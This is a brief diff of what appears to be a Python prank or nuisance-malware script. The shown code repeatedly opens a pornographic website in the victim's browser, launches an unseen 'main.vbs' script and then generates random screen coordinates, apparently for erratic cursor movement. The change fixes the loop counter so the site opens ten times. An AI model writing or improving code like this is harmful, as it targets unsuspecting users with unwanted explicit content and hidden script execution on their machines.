@@ -32,7 +32,7 @@ def main():
     while a < 10:
         subprocess.getoutput('explorer https://pornhub.com')
         subprocess.getoutput("start main.vbs")
-    i=0
+        a += 1
     for i in range(0, 150):
         rndvalueX = randint(0, 1919)
         rndvalueY = randint(0,1019)
